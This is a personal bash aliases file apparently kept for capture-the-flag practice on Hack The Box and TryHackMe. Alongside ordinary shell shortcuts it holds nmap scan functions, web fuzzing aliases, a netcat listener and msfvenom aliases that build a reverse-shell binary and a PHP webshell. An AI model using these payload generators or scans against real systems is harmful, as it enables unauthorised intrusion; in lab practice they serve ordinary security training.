###########
# Aliases #
###########

alias updatey='sudo apt update && sudo apt -y upgrade && sudo apt -y autoremove'

# enable color support of ls
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias cls='clear'

# git shortcuts
alias gs='git status'
alias ga='git add'
alias gc='git commit'
alias gp='git push'
alias gco='git checkout'

# tmux vpn connect
alias htbvpn='tmux new-session -s htbvpn "sudo openvpn ~/Documents/htb.ovpn"'
alias thmvpn='tmux new-session -s thmvpn "sudo openvpn ~/Documents/thm.ovpn"'

# quick connect to openvpn (outside tmux)
alias vpnup='sudo openvpn ~/Documents/htb.ovpn'

# port scanning function
port-scan() {
    if [ $# -ne 1 ]; then
        echo -e "\e[91mUsage: port-scan <target-ip>\e[0m"
        return 1
    fi
    local box="$1"
    local timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
    local output_dir="scans/$box"
    mkdir -p "$output_dir"
    local initial_scan="$output_dir/${box}_initial_$timestamp"
    local detailed_scan="$output_dir/${box}_detailed_$timestamp"
    echo -e "\e[92m[+] Scanning all ports on $box...\e[0m"
    sudo nmap -Pn -sS -p- --open -T4 --min-rate=1000 "$box" -oN "${initial_scan}.nmap"
    local ports=$(grep "/tcp" "${initial_scan}.nmap" | grep "open" | awk -F '/' '{print $1}' | paste -sd, -)
    if [ -z "$ports" ]; then
        echo -e "\e[93m[-] No open ports found on $box.\e[0m"
        return
    fi
    echo -e "\e[92m[+] Found open ports: $ports\e[0m"
    echo -e "\e[94m[*] Running detailed scan on $box...\e[0m"
    sudo nmap -Pn -p "$ports" -sC -sV --script=default "$box" -oN "${detailed_scan}.nmap"
    echo -e "\e[92m[+] Detailed scan saved to: ${detailed_scan}.nmap\e[0m"
}

# Nmap Shortcuts
alias nmapfast='nmap -F -Pn -sV --open'
alias nmapfull='sudo nmap -Pn -sS -T4 -p- --open'

# === Utility Functions ===

# Show available custom aliases and functions
function cheat() {
    grep -E "^alias|^function" ~/.bash_aliases | grep -v '^#'
}

# Reload shell configuration
alias reload="source ~/.bashrc"

# Safer file ops
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# Quick shortcuts
alias c='clear'
alias tree='tree -C -L 2'

# Continue downloads
alias wget='wget -c'

# Open with default applications
alias open='xdg-open'

# Searchsploit functions
ssp() { searchsploit "$@"; }
ssx() { searchsploit -x "$@"; }
ssm() { searchsploit -m "$@"; }

# CTF Directory Navigation
alias ctf='cd ~/ctf && ls'
alias htb='cd ~/ctf/htb && ls'
alias thm='cd ~/ctf/thm && ls'
alias box='mkdir -p scans exploits notes loot && ls'

# Network and IP utilities
alias myip='curl -s ifconfig.me && echo'
alias vpnip='ip addr show tun0 | grep inet | awk "{print \$2}" | cut -d "/" -f1'
alias flushdns='sudo systemd-resolve --flush-caches'
alias ports='netstat -tulnp'

# Simple HTTP Server
alias pyserve='python3 -m http.server 80'

# Web Enumeration & Fuzzing
alias gobuster='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt'
alias fuzz='ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u'

# Payload Generators & Reverse Shells
alias listen='nc -lvnp'
alias revshell='msfvenom -p linux/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=9001 -f elf -o revshell'
alias webshell='msfvenom -p php/reverse_php LHOST=$(vpnip) LPORT=9001 -o shell.php'

# Docker Shortcuts
alias dockershell='docker exec -it'
alias dockerclean='docker rm -v $(docker ps -aq -f status=exited)'

# Tmux Shortcuts
alias tmuxstart='tmux new-session -s'
alias tmuxattach='tmux attach -t'
alias tmuxlist='tmux ls'

# Miscellaneous Tools
alias extract='7z x'
alias dos2unix='sed -i "s/\r//"'
alias urlencode='python3 -c "import urllib.parse, sys; print(urllib.parse.quote_plus(sys.argv[1]))"'

# Shields Up Network Scanner (function)
shieldsup() {
  INTERFACE="${1:-tun0}"
  IP="${2:-10.10.14.23}"
  NETWORK="${3:-10.10.14.0/24}"
  TIMESTAMP=$(date "+%Y-%m-%d_%H-%M-%S")
  PCAP_FILE="scan_capture_${TIMESTAMP}.pcap"
  echo -e "\e[92m[+] Shields Up: Monitoring interface $INTERFACE for scans on IP $IP...\e[0m"
  sudo tcpdump -i "$INTERFACE" -nnvv "src net $NETWORK and dst host $IP" -w "$PCAP_FILE" -U |
  tcpdump -nr - |
  grep --color=auto -Ei 'Flags \[S\]|ICMP echo request|ARP.*who-has'
  echo -e "\e[93m[+] Capture saved to $PCAP_FILE\e[0m"
}

